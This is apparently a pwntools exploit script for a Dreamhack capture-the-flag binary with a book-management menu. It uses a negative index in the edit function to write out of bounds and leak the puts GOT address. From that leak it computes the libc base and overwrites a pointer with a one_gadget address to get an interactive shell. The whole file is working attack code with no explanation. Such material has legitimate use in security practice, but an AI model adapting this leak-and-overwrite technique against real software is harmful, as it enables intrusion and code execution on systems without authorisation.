from pwn import *
elf_file = FILENAME = './prob'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log

libc = ELF('./libc.so.6')


HOST = 'host8.dreamhack.games'
POST = 17437


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''
  b *0x401ab5
  b *0x401382
  ''')



def reg(no, price, author, title):
    c.sendlineafter('nu:', '1')
    c.sendlineafter(':', str(no))
    c.sendlineafter(':', str(price))
    c.sendlineafter(':', author)
    c.sendlineafter(':', title)

def info(index, option):
    c.sendlineafter('nu:', '2')
    c.sendlineafter(':', str(index))
    c.sendlineafter(':', str(option))

def dele(index):
    c.sendlineafter('nu:', '3')
    c.sendlineafter(':', str(index))

def edit(index, option, data):
    c.sendlineafter('nu:', '4')
    c.sendlineafter(':', str(index))
    c.sendlineafter(':', str(option))#can use "-1"
    c.sendlineafter(':', data)
    sleep(0.1)


c.sendlineafter('name?:','1')

for n in range(3):
    reg(n,n,'AAAA',str(n))

dele(2)

payload = b'\x40'*0x30
payload+= p64(0)
payload+= p64(0x31)
payload+= p64(0x404018)


edit(1,-19,str(0x404020))
info(0,0)
c.recvuntil('Book Author: ')

got_puts = u64(c.recvline().replace(b'\n',b'')+b'\x00\x00')
print(hex(got_puts))

libc.address = got_puts-libc.sym['puts']
print(hex(libc.address))

edit(0,3,p64(libc.address+0xe3b01))

c.interactive()